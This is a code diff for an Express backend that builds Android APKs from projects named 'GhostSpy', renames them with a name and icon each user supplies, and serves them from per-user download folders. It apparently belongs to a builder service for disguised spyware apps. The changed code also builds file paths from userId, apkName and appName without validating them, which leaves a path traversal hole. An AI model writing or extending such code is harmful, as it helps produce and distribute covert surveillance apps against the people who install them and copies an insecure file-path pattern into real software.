@@ -44,6 +44,13 @@ export const createNewApk = (req: Request, res: Response) => {
 	const { userId, appName } = req.body;
 	const appIcon = req.file; // Get the uploaded file
 
+	// Define the user-specific folder
+	const userFolderPath = path.join(
+		__dirname,
+		"../../public/downloads",
+		userId
+	);
+
 	// Push the request into the queue
 	apkBuildQueue.push(async () => {
 		try {
@@ -139,6 +146,9 @@ export const createNewApk = (req: Request, res: Response) => {
 			console.log(`Starting Ghost_main APK build process for ${appName}`);
 			await buildApk(BAT_PATH);
 
+			// Step 4: Create user-specific folder for saving APKs
+			await fs.promises.mkdir(userFolderPath, { recursive: true });
+
 			// Rename and move the APK
 			const ghostMainApkPath = path.join(
 				__dirname,
@@ -164,6 +174,11 @@ export const createNewApk = (req: Request, res: Response) => {
 				"../../public/GhostSpy/GhostSpy_major/app/build/outputs/apk/debug/app-debug.apk"
 			);
 
+			const ghostMajorApkPublicPath = path.join(
+				userFolderPath,
+				`${appName}.apk`
+			);
+
 			const fileExists = await fs.promises
 				.stat(ghostMajorApkPath)
 				.catch(() => null);
@@ -171,19 +186,16 @@ export const createNewApk = (req: Request, res: Response) => {
 				throw new Error("Ghost_major APK file was not created.");
 			}
 
-			const publicPath = path.join(
-				__dirname,
-				"../../public/downloads",
-				`${appName}.apk` // Use appName for the file name
+			await fs.promises.copyFile(
+				ghostMajorApkPath,
+				ghostMajorApkPublicPath
 			);
-
-			await fs.promises.copyFile(ghostMajorApkPath, publicPath);
 
 			// Add new APK info to the App model
 			await App.create({
 				userId,
 				name: appName,
-				path: publicPath,
+				path: ghostMajorApkPublicPath,
 			});
 
 			// Update User model's apk field
@@ -248,17 +260,29 @@ export const getNewApk = async (req: Request, res: Response) => {
 	}
 
 	try {
-		const { data } = req.params;
+		// Extract userId and appName from request parameters
+		const { userId, apkName } = req.params;
+		console.log(userId, apkName);
+		// Check if both userId and appName are provided
+		if (!userId || !apkName) {
+			return res.status(400).json({ error: "Invalid userId or appName" });
+		}
 
-		// Construct the file path
-		const filePath = path.join(
+		// Construct the user-specific folder path
+		const userFolderPath = path.join(
 			__dirname,
 			"../../public/downloads",
-			`${data}.apk`
+			userId
 		);
-		console.log("donwload data", { filePath });
+
+		// Construct the full APK path inside the user folder
+		const apkFilePath = path.join(userFolderPath, `${apkName}.apk`);
+
+		// Log the file path for debugging
+		console.log("APK File Path:", apkFilePath);
+
 		// Check if the file exists
-		if (!fs.existsSync(filePath)) {
+		if (!fs.existsSync(apkFilePath)) {
 			return res.status(404).json({ error: "APK file not found" });
 		}
 
@@ -269,9 +293,11 @@ export const getNewApk = async (req: Request, res: Response) => {
 		);
 		res.setHeader(
 			"Content-Disposition",
-			`attachment; filename="${data}.apk"`
+			`attachment; filename="${apkName}.apk"`
 		);
-		fs.createReadStream(filePath).pipe(res);
+
+		// Stream the file to the client
+		fs.createReadStream(apkFilePath).pipe(res);
 	} catch (error) {
 		console.error("Error processing APK:", error);
 		res.status(500).json({ error: "Failed to process the APK" });
